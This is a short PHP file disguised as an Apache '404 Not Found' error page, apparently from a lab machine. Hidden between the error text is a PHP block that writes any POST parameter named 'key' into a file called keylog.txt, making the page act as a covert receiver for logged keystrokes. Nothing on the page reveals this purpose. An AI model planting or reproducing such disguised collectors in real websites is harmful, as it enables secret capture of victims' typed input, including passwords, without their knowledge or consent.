<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<?php
if(!empty($_POST['key'])) {
	$file = fopen('keylog.txt', 'a+');
	fwrite($file, $_POST['key']);
	fclose($file);
}
?>
<address>Apache/2.4.46 (Debian) Server at 10.0.2.15 Port 80</address>
</body></html>
